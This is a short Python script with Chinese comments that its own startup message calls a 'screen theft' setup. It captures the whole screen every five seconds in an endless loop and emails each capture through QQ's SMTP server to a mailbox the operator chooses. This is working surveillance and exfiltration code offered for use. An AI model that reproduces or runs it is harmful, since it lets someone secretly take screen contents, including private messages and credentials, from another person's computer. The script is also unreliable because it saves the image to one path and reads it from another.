# coding=utf-8
# python3
# by 此意系

# 使用SMTP协议及截图函数完成屏幕截取并自动发送到指定邮箱。
# 邮箱开启SMTP服务，记住授权码
# 登录网页版邮箱-->设置-->账户，找到SMTP服务将其开启，记住授权码
import smtplib
import time
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from PIL import ImageGrab

def IMG(fromaddr, password, toaddrs):
    i = 1
    while True:
        im = ImageGrab.grab()
        im.save('.\\1.png')
        print("第%d个屏幕截取成功!" % i)
        time.sleep(5)
        i += 1
        smtp_s(fromaddr, password, toaddrs)

def smtp_s(fromaddr, password, toaddrs):
    # fromaddr = '开启SMTP服务的邮箱...'  #  发送方
    # password = ''    # 授权码
    # # 接收方
    # toaddrs = ['接收方邮箱']    # 邮箱接受方邮箱地址 注意需要[]包裹，这意味着你可以写多个邮件地址群发
    content = '正文内容'
    textApart = MIMEText(content)

    imageFile = r"D:\\1.png"  # r 表示原生字符，不进行转义
    imageApart = MIMEImage(open(imageFile, 'rb').read(), imageFile.split('.')[-1])
    imageApart.add_header('Content-Disposition', 'attachment', filename="屏幕截图.png")

    m = MIMEMultipart()
    m.attach(textApart)  # 文本
    m.attach(imageApart)  # 发送图片附件

    m['Subject'] = '标题'
    # m['From'] = "发件人"
    try:
        server = smtplib.SMTP('smtp.qq.com')  # 指定SMTP服务器
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddrs, m.as_string())
        print('发送成功！')
        server.quit()
    except smtplib.SMTPException as e:
        print('error:', e)  # 打印错误


if __name__ == '__main__':
    print("开始执行屏幕窃取配置...")
    time.sleep(3)
    # fromaddr, password, toaddrs
    fromaddr = str(input("请输入要发送方的邮箱:"))
    password = str(input("请输入授权码:"))
    toaddrs=[]
    Myemail = str(input("请输入接收方的邮箱:"))
    toaddrs.append(Myemail)
    IMG(fromaddr, password, toaddrs)
